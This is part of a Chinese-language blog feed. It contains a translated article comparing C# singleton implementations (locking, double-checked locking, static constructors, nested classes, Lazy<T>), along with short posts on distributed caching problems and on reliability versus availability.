  &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;readonly&lt;/span&gt; &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;object&lt;/span&gt; padlock = &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;object&lt;/span&gt;();

  Singleton()
  {
  }

  &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;static&lt;/span&gt; Singleton Instance
  {
    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;get&lt;/span&gt;
    {
      &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;lock&lt;/span&gt; (padlock)
      {
        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; (instance == &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;null&lt;/span&gt;)
        {
          instance = &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;new&lt;/span&gt; Singleton();
        }
        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; instance;
      }
    }
  }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;此实现是线程安全的。线程在共享对象上加锁（&lt;em&gt;takes out a lock&lt;/em&gt;），然后在创建实例之前检查是否已创建实例。这可以解决内存屏障问题（因为锁定可确保所有读取均在获取锁之后逻辑发生，而解锁可确保所有写入均在锁释放之前逻辑发生）并确保只有一个线程将创建一个实例（仅一个线程一次可以位于代码的该部分中，到第二个线程进入该线程时，第一个线程将创建该实例，因此该表达式的计算结果为&lt;code&gt;false&lt;/code&gt;）。不幸的是，每次请求实例时都需要获取锁，因此性能会受到影响。&lt;/p&gt;
&lt;p&gt;请注意，我没有像此实现的某些版本那样锁定&lt;code&gt;typeof(Singleton)&lt;/code&gt;，而是锁定了类私有的静态变量的值。锁定其他类可以访问和锁定的对象（such as the type）可能会导致性能问题甚至死锁。这是我的一般样式首选项-尽可能仅锁定专门为锁定目的而创建的对象，或者为特定目的而将其锁定在哪个文档上（例如用于等待/触发队列）。通常，此类对象应为使用它们的类所专用。这有助于使编写线程安全的应用程序变得更加容易。&lt;/p&gt;
&lt;h2 id=&#34;third-version---attempted-thread-safety-using-double-check-locking&#34;&gt;Third version - attempted thread-safety using double-check locking&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c#&#34; data-lang=&#34;c#&#34;&gt;&lt;span style=&#34;color:#228b22&#34;&gt;// Bad code! Do not use!
&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;sealed&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#008b45;font-weight:bold&#34;&gt;Singleton&lt;/span&gt;
{
  &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;static&lt;/span&gt; Singleton instance = &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;null&lt;/span&gt;;
  &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;readonly&lt;/span&gt; &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;object&lt;/span&gt; padlock = &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;object&lt;/span&gt;();

  Singleton()
  {
  }

  &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;static&lt;/span&gt; Singleton Instance
  {
    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;get&lt;/span&gt;
    {
      &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; (instance == &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;null&lt;/span&gt;)
      {
        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;lock&lt;/span&gt; (padlock)
        {
          &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; (instance == &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;null&lt;/span&gt;)
          {
            instance = &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;new&lt;/span&gt; Singleton();
          }
        }
      }
      &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; instance;
    }
  }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;此实现方式（&lt;em&gt;implementation&lt;/em&gt;）尝试不再每次都加锁，同时保证线程安全。遗憾的是，该模式有四个缺点（&lt;em&gt;there are four downsides to the pattern&lt;/em&gt;）：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;它在Java中不起作用。这么说这似乎有些不合理，但是值得一提的是，您是否需要Java中的单例模式，C＃程序员也很可能是Java程序员。 Java内存模型无法确保在将对新对象的引用分配给实例之前，执行完构造函数。 Java内存模型针对1.5版进行了重新加工，但是在此之后，在没有易失性变量的情况下，双重检查锁定仍然被破坏（像C＃一样）。&lt;/li&gt;
&lt;li&gt;没有任何内存障碍，它在&lt;code&gt;ECMA CLI&lt;/code&gt;规范中也被打破。在.NET 2.0内存模型（比ECMA规范更强）下，它很可能是安全的，但我宁愿不依赖那些更强的语义，尤其是在对安全性有任何疑问的情况下。将实例变量设置为&lt;code&gt;volatile&lt;/code&gt;也有效，就像显式的内存屏障调用一样，但这样的话即使是大佬也无法确切地确定需要哪些屏障。我倾向于不去用大佬们有争议的方法！&lt;/li&gt;
&lt;li&gt;很容易出错。该模式必须与上面的完全一样-任何重大更改都可能影响性能或正确性。&lt;/li&gt;
&lt;li&gt;它的性能仍然不如后来的实现方式。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;fourth-version---not-quite-as-lazy-but-thread-safe-without-using-locks&#34;&gt;Fourth version - not quite as lazy, but thread-safe without using locks&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c#&#34; data-lang=&#34;c#&#34;&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;sealed&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#008b45;font-weight:bold&#34;&gt;Singleton&lt;/span&gt;
{
  &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;readonly&lt;/span&gt; Singleton instance = &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;new&lt;/span&gt; Singleton();

  &lt;span style=&#34;color:#228b22&#34;&gt;// Explicit static constructor to tell C# compiler
&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#228b22&#34;&gt;// not to mark type as beforefieldinit
&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;static&lt;/span&gt; Singleton()
  {
  }

  &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;private&lt;/span&gt; Singleton()
  {
  }

  &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;static&lt;/span&gt; Singleton Instance
  {
    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;get&lt;/span&gt;
    {
      &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; instance;
    }
  }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如您所见，这确实非常简单，那它是怎么实现线程安全的，它有多懒呢？Well，将C＃中的静态构造函数指定为仅在创建类的实例或引用静态成员时执行，并且每个&lt;code&gt;AppDomain&lt;/code&gt;仅执行一次。鉴于无论其他情况如何都需要执行对新构造的类型的检查，因此比在前面的示例中添加额外的检查要快。&lt;/p&gt;
&lt;p&gt;但是，这种方法也有一些缺点（&lt;em&gt;wrinkles&lt;/em&gt;）：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;它没有其他实现那么懒。特别是，当具有实例以外的静态成员时，对这些成员的首次引用将涉及创建实例。在下一个实现中将对此进行更正。&lt;/li&gt;
&lt;li&gt;如果一个静态构造函数调用另一个而又再次调用第一个静态构造函数，则会带来复杂性。请查阅&lt;code&gt;.NET规范（currently section 9.5.3 of partition II&lt;/code&gt;），以获取有关类型初始值设定项的确切性质的更多详细信息。它们不太可能会影响程序（&lt;em&gt;they&amp;rsquo;re unlikely to bite you&lt;/em&gt;），但值得一提的是，静态构造函数在生命周期内存在互相引用（&lt;em&gt;the consequences of static constructors which refer to each other in a cycle&lt;/em&gt;）。&lt;/li&gt;
&lt;li&gt;只有当类型未使用称为&lt;code&gt;beforefieldinit&lt;/code&gt;的特殊标志进行标记时，.NET才能保证类型初始化程序的惰性。不幸的是，C＃编译器（至少是.NET 1.1运行时中提供的）将所有没有静态构造函数（即看起来像构造函数但被标记为静态的块）的类型都标记为&lt;code&gt;beforefieldinit&lt;/code&gt;。我有一篇&lt;a href=&#34;https://csharpindepth.com/articles/BeforeFieldInit&#34;&gt;文章&lt;/a&gt;，详细介绍了这个问题。还要注意，它会影响性能，如页面底部所述。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这种实现方式可以采取的一种捷径：仅使实例成为公共静态只读变量，并完全摆脱该属性。这使得基本框架代码绝对很小！但是，许多人更喜欢拥有属性，以防将来需要采取进一步的措施，并且&lt;code&gt;JIT&lt;/code&gt;内联可能使性能相同。 （请注意，如果您需要惰性，则仍然需要静态构造函数本身。）&lt;/p&gt;
&lt;h2 id=&#34;fifth-version---fully-lazy-instantiation&#34;&gt;Fifth version - fully lazy instantiation&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c#&#34; data-lang=&#34;c#&#34;&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;sealed&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#008b45;font-weight:bold&#34;&gt;Singleton&lt;/span&gt;
{
  &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;private&lt;/span&gt; Singleton()
  {
  }

  &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;static&lt;/span&gt; Singleton Instance
  {
    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;get&lt;/span&gt; { &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; Nested.instance; }
  }

  &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#008b45;font-weight:bold&#34;&gt;Nested&lt;/span&gt;
  {
    &lt;span style=&#34;color:#228b22&#34;&gt;// Explicit static constructor to tell C# compiler
&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#228b22&#34;&gt;// not to mark type as beforefieldinit
&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;static&lt;/span&gt; Nested()
    {
    }

    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;internal&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;readonly&lt;/span&gt; Singleton instance = &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;new&lt;/span&gt; Singleton();
  }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在这里，实例化是由对嵌套类的静态成员的第一次引用触发的，该实例仅在&lt;code&gt;Instance&lt;/code&gt;中发生。这意味着该实现完全是懒的，同事具有先前性能的所有性能优势。请注意，尽管嵌套类可以访问封闭类的私有成员，但事实并非如此，因此这里需要实例化。但是，由于类本身是私有的，所以这不会引起任何其他问题。但是，为了使实例化变得懒惰，代码有些复杂。&lt;/p&gt;
&lt;h2 id=&#34;sixth-version---using-net-4s-lazyt-type&#34;&gt;Sixth version - using .NET 4&amp;rsquo;s &lt;code&gt;Lazy&amp;lt;T&amp;gt;&lt;/code&gt; type&lt;/h2&gt;
&lt;p&gt;如果使用的是.NET 4（或更高版本），则可以使用&lt;a href=&#34;http://msdn.microsoft.com/en-us/library/dd642331.aspx&#34;&gt;System.Lazy&lt;/a&gt;类型使懒变得非常简单。您需要做的就是将委托传递给构造函数，该构造函数调用Singleton构造函数，使用&lt;code&gt;lambda表达式&lt;/code&gt;最容易完成。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c#&#34; data-lang=&#34;c#&#34;&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;sealed&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#008b45;font-weight:bold&#34;&gt;Singleton&lt;/span&gt;
{
    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;readonly&lt;/span&gt; Lazy&amp;lt;Singleton&amp;gt; lazy = &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;new&lt;/span&gt; Lazy&amp;lt;Singleton&amp;gt; (() =&amp;gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;new&lt;/span&gt; Singleton());

    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;static&lt;/span&gt; Singleton Instance { 
      &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;get&lt;/span&gt; { &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; lazy.Value; }
    }

    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;private&lt;/span&gt; Singleton()
    {
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;它很简单，性能也很好。如果需要，还可以使用&lt;a href=&#34;http://msdn.microsoft.com/en-us/library/dd642334.aspx&#34;&gt;IsValueCreated&lt;/a&gt;属性检查实例是否已创建。&lt;/p&gt;
&lt;p&gt;上面的代码隐式地使用&lt;code&gt;LazyThreadSafetyMode.ExecutionAndPublication&lt;/code&gt;作为&lt;code&gt;Lazy&amp;lt;Singleton&amp;gt;&lt;/code&gt;的线程安全模式。根据您的要求，您可能希望尝试其他模式。&lt;/p&gt;
&lt;h2 id=&#34;performance-vs-laziness&#34;&gt;Performance vs laziness&lt;/h2&gt;
&lt;p&gt;在许多情况下，您实际上并不需要完全的懒，除非类初始化时需要做特别耗时的事情，或者在其他地方有副作用，否则可以忽略上面有关显式静态构造函数的实现方法。这可以提高性能，因为它允许&lt;code&gt;JIT&lt;/code&gt;编译器进行一次检查（例如，在方法开始时进行检查），以确保类型已初始化，然后从此开始进行假定。如果您的单例实例是在相对紧凑的循环中引用的，则这可能会（相对）产生明显的性能差异。您应该确定是否需要完全延迟的实例化，并在类中适当地记录此决定。&lt;/p&gt;
&lt;p&gt;该页面存在的很多原因是人们试图变得聪明（&lt;em&gt;A lot of the reason for this page&amp;rsquo;s existence is people trying to be clever&lt;/em&gt;），因此提出了双重检查的锁定算法。人们常常认为加锁是付出昂贵代价的操作，这是普遍的并且是错误的。我编写了一个非常快速的基准测试，它以十亿次尝试各种变体，以循环方式获取单例实例。这并不是十分科学（&lt;em&gt;It&amp;rsquo;s not terribly scientific&lt;/em&gt;），因为在现实生活中，您可能想知道，如果每次迭代实际上都涉及到对获取单例的方法的调用等，该过程有多快。但是，它确实显示了重要的意义。在我的笔记本电脑上，最慢的解决方案（约为5倍）是加锁的解决方法（解决方案2）。那重要吗？当您记住它仍然可以在40秒内成功获取十亿次单例时，可能就不会了。 （注意：本文最初是在很早以前写的，我希望现在可以有更好的性能。）这意味着，如果您“仅”每秒获取40万次单例，则获取的成本将不断增加达到1％的性能。因此，改善性能并不会起到太大作用。现在，如果您经常使用单例模式，您是否是在循环中使用它？如果您非常在乎提高性能，为什么不在循环之外声明局部变量，请获取一次单例然后循环。所以，即使是最慢的实现也很容易做到。&lt;/p&gt;
&lt;p&gt;我非常有兴趣看到一个现实世界的应用程序，在该应用程序中，使用简单的加锁和使用较快速的解决方案之一之间的差异实际上带来了显着的性能差异。&lt;/p&gt;
&lt;h2 id=&#34;exceptions&#34;&gt;Exceptions&lt;/h2&gt;
&lt;p&gt;有时，您需要在单例构造函数中进行工作，这可能会引发异常，但对整个应用程序可能不会致命。您的应用程序可能能够解决问题，并希望重试。在这个阶段，使用类型初始值设定项构造单例成为问题。不同的运行时对这种情况的处理方式不同，但是我不知道哪个运行者可以做所需的事情（再次运行类型初始化器），即使这样做，您的代码也会在其他运行时中损坏。为了避免这些问题，我建议使用页面上列出的第二种模式，只需使用一个简单的锁，然后每次都要进行检查，如果尚未成功构建该实例，则可以在方法/属性中进行构建。&lt;/p&gt;
&lt;h2 id=&#34;conclusion-modified-slightly-on-january-7th-2006-updated-feb-12th-2011&#34;&gt;Conclusion (modified slightly on January 7th 2006; updated Feb 12th 2011)&lt;/h2&gt;
&lt;p&gt;在C＃中有多种不同的方式来实现单例模式。读者写信给我，详细介绍了他封装同步方面的一种方式，尽管我承认这在某些非常特殊的情况下（特别是在您想要非常高性能的情况下，并且能够确定单例是否已经被使用的能力）很有用。创建，并且完全懒惰（无论是否调用其他静态成员）。我个人认为这种情况不会经常出现，值得在此页面上进行进一步介绍，但是如果您遇到这种情况，请发&lt;a href=&#34;skeet@pobox.com&#34;&gt;邮件&lt;/a&gt;给我。&lt;/p&gt;
&lt;p&gt;我的个人偏爱是解决方案4：通常，我只有在我需要能够在不触发初始化的情况下调用其他静态方法，或者如果我需要知道单例是否已经被实例化，或者是否需要知道单例是否已被实例化时才不会使用该方法。我不记得我上次遇到这种情况，假设我有过，在这种情况下，我可能会选择解决方案2，该解决方案仍然很不错，而且很容易就可以实现。&lt;/p&gt;
&lt;p&gt;解决方案5很优雅，但比2或4棘手，而且正如我上面所说，它提供的好处似乎很少有用。如果您使用的是.NET 4，则解决方案6是实现懒惰的一种更简单的方法，它还具有明显的惰性。我目前倾向于仅通过习惯就使用解决方案4，但是如果我与经验不足的开发人员一起工作，我很可能会选择解决方案6作为一种简单且普遍适用的模式开始。&lt;/p&gt;
&lt;p&gt;（我不会使用解决方案1，因为它是有缺陷的，我不会使用解决方案3，因为它比不过5。）&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;reference&#34;&gt;Reference&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&#34;https://csharpindepth.com/articles/Singleton&#34;&gt;https://csharpindepth.com/articles/Singleton&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.cnblogs.com/leolion/p/10241822.html&#34;&gt;https://www.cnblogs.com/leolion/p/10241822.html&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
- https://www.openheart.icu/cs/implementing-the-singleton-pattern-in-csharp/ - ALL RIGHTS RESERVED KRIS NIE</description>
        </item>
    
    
    
        <item>
        <title>Distributed cache</title>
        <link>https://www.openheart.icu/cs/%E5%88%86%E5%B8%83%E5%BC%8F%E7%BC%93%E5%AD%98/</link>
        <pubDate>Fri, 24 Jul 2020 00:00:50 +0000</pubDate>
        
        <guid>https://www.openheart.icu/cs/%E5%88%86%E5%B8%83%E5%BC%8F%E7%BC%93%E5%AD%98/</guid>
        <description>42th openheart https://www.openheart.icu/cs/%E5%88%86%E5%B8%83%E5%BC%8F%E7%BC%93%E5%AD%98/ -&lt;p&gt;&lt;em&gt;简单了解分布式缓存的各种概念&lt;/em&gt;&lt;/p&gt;
&lt;h1 id=&#34;缓存雪崩&#34;&gt;缓存雪崩&lt;/h1&gt;
&lt;p&gt;缓存雪崩我们可以简单的理解为：由于原有&lt;strong&gt;缓存失效&lt;/strong&gt;，新缓存未到期间所有原本应该访问缓存的请求都去查询数据库了，而对数据库 CPU 和内存造成巨大压力，严重的会造成数据库宕机。从而形成一系列连锁反应，造成整个系统崩溃。&lt;/p&gt;
&lt;p&gt;关键词：缓存失效，针对这种情况一般有三种处理办法：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;一般并发量不是特别多的时候，使用最多的解决方案是加锁排队。&lt;/li&gt;
&lt;li&gt;&lt;!-- raw HTML omitted --&gt;给每一个缓存数据增加相应的缓存标记，记录缓存的是否失效，如果缓存标记失效，则更新数据缓存。&lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;&lt;!-- raw HTML omitted --&gt;为 key 设置不同的缓存失效时间。&lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;em&gt;第二、第三中方法在面试中均被提到过，很遗憾我只想到了第一种解决办法（纯粹靠蒙），被连续问到两次后觉得分布式缓存需要整体都了解一下，于是去查资料整理了本文&lt;/em&gt; 😁&lt;/p&gt;
&lt;h1 id=&#34;缓存穿透&#34;&gt;缓存穿透&lt;/h1&gt;
&lt;p&gt;缓存穿透是指用户查询数据，在数据库没有，自然在缓存中也不会有。这样就导致用户查询的时候，在 缓存中找不到，每次都要去数据库再查询一遍，然后返回空（相当于进行了两次无用的查询）。这样请 求就绕过缓存直接查数据库，这也是经常提的缓存命中率问题。&lt;/p&gt;
&lt;p&gt;有很多种方法可以有效地解决缓存穿透问题，最常见的则是采用布隆过滤器，将所有可能存在的数据哈 希到一个足够大的 bitmap 中，一个一定不存在的数据会被这个 bitmap 拦截掉，从而避免了对底层存 储系统的查询压力。&lt;/p&gt;
&lt;p&gt;另外也有一个更为简单粗暴的方法，如果一个查询返回的数据为空（不管是数据不 存在，还是系统故障），我们仍然把这个空结果进行缓存，但它的过期时间会很短，最长不超过五分钟。 通过这个直接设置的默认值存放到缓存，这样第二次到缓冲中获取就有值了，而不会继续访问数据库。&lt;/p&gt;
&lt;h1 id=&#34;缓存预热&#34;&gt;缓存预热&lt;/h1&gt;
&lt;p&gt;缓存预热就是系统上线后，将相关的缓存数据直接加载到缓存系统。这样就可以避免在用户请求的时候，先查询数据库，然后再将数据缓存的问题。用户直接查询事先被预热的缓存数据。&lt;/p&gt;
&lt;h1 id=&#34;缓存更新&#34;&gt;缓存更新&lt;/h1&gt;
&lt;p&gt;缓存更新除了缓存服务器自带的缓存失效策略之外（Redis 默认的有 6 中策略可供选择），我们还可以根据具体的业务需求进行自定义的缓存淘汰，常见的策略有两种：&lt;/p&gt;
&lt;p&gt;（1）定时去清理过期的缓存；&lt;/p&gt;
&lt;p&gt;（2）当有用户请求过来时，再判断这个请求所用到的缓存是否过期，过期的话就去底层系统得到新数据并更新缓存。&lt;/p&gt;
&lt;h1 id=&#34;缓存降级&#34;&gt;缓存降级&lt;/h1&gt;
&lt;p&gt;当访问量剧增、服务出现问题（如响应时间慢或不响应）或非核心服务影响到核心流程的性能时，仍然需要保证服务还是可用的，即使是有损服务。系统可以根据一些关键数据进行自动降级，也可以配置开关实现人工降级。 降级的最终目的是保证核心服务可用，即使是有损的。 而且有些服务是无法降级的（如加入购物车、结算）。&lt;/p&gt;
- https://www.openheart.icu/cs/%E5%88%86%E5%B8%83%E5%BC%8F%E7%BC%93%E5%AD%98/ - ALL RIGHTS RESERVED KRIS NIE</description>
        </item>
    
    
    
        <item>
        <title>Reliability&amp;Availability</title>
        <link>https://www.openheart.icu/cs/%E9%AB%98%E5%8F%AF%E7%94%A8%E6%80%A7%E5%92%8C%E9%AB%98%E5%8F%AF%E9%9D%A0%E6%80%A7/</link>
        <pubDate>Fri, 24 Jul 2020 00:00:50 +0000</pubDate>
        
        <guid>https://www.openheart.icu/cs/%E9%AB%98%E5%8F%AF%E7%94%A8%E6%80%A7%E5%92%8C%E9%AB%98%E5%8F%AF%E9%9D%A0%E6%80%A7/</guid>
        <description>42th openheart https://www.openheart.icu/cs/%E9%AB%98%E5%8F%AF%E7%94%A8%E6%80%A7%E5%92%8C%E9%AB%98%E5%8F%AF%E9%9D%A0%E6%80%A7/ -&lt;h1 id=&#34;区分高可靠性与高可用性&#34;&gt;区分高可靠性与高可用性&lt;/h1&gt;
&lt;p&gt;Reliability和Availability分别对应可靠性和可用性, 这两个概念既有区别也有联系:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Reliability定义为一个服务连续无故障运行的时间，无故障运行的时间越长，可靠性就越高。&lt;/li&gt;
&lt;li&gt;Availiability定义为在足够长的时间里，比如一年的时间里，一个服务可用的时间，服务可用时间越长越好。一般用可服务时间除于总时间算出一个百分比，用百分比作为度量。比如一个服务如果有5个9的可用性，指的就是一年里99.999%时间里服务都是可用的。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;有两个极端的例子可以很好的说明这两个概念的区别:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;假想一个服务，可靠性很高，平均来说可以稳定运行10年，但是一旦服务中断，要用一年的时间来恢复，那么它的可用性只有90%。&lt;/li&gt;
&lt;li&gt;假想另一个服务，可靠性很差，运行10秒就会宕机，但是恢复服务只需要1ms, 那么它的可用性是99.99%&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;从这两个极端的例子可以看出，提高可用性有两条路:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;一是提高可靠性，当然影响可靠性的原因有很多，包括硬件，软件，网络，运维等。但是有人做过统计，软件的bug是影响可靠性的最主要的因素。并且提高软件质量相较于使用更可靠的硬件也算成本较低的方式了，&lt;/li&gt;
&lt;li&gt;二是减少恢复时间，一旦出现宕机，如果能在秒级恢复，那对业务影响是很小的。&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;高可靠性的实现&#34;&gt;高可靠性的实现&lt;/h1&gt;
&lt;p&gt;&amp;hellip;&lt;/p&gt;
&lt;h1 id=&#34;高可用性的实现&#34;&gt;高可用性的实现&lt;/h1&gt;
&lt;p&gt;高可用HA（High Availability）是分布式系统架构设计中必须考虑的因素之一，它通常是指，通过设计减少系统不能提供服务的时间。&lt;/p&gt;
&lt;p&gt;方法论上，高可用是通过&lt;strong&gt;冗余+自动故障转移&lt;/strong&gt;来实现的。&lt;/p&gt;
&lt;p&gt;整个互联网分层系统架构的高可用，又是通过每一层的&lt;strong&gt;冗余+自动故障转移&lt;/strong&gt;来综合实现的，具体的：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;【客户端层】到【反向代理层】的高可用，是通过反向代理层的冗余实现的，常见实践是keepalived + virtual IP自动故障转移&lt;/li&gt;
&lt;li&gt;【反向代理层】到【站点层】的高可用，是通过站点层的冗余实现的，常见实践是nginx与web-server之间的存活性探测与自动故障转移&lt;/li&gt;
&lt;li&gt;【站点层】到【服务层】的高可用，是通过服务层的冗余实现的，常见实践是通过service-connection-pool来保证自动故障转移&lt;/li&gt;
&lt;li&gt;【服务层】到【缓存层】的高可用，是通过缓存数据的冗余实现的，常见实践是缓存客户端双读双写，或者利用缓存集群的主从数据同步与sentinel保活与自动故障转移；更多的业务场景，对缓存没有高可用要求，可以使用缓存服务化来对调用方屏蔽底层复杂性&lt;/li&gt;
&lt;li&gt;【服务层】到【数据库“读”】的高可用，是通过读库的冗余实现的，常见实践是通过db-connection-pool来保证自动故障转移&lt;/li&gt;
&lt;li&gt;【服务层】到【数据库“写”】的高可用，是通过写库的冗余实现的，常见实践是keepalived + virtual IP自动故障转移&lt;/li&gt;
&lt;/ol&gt;
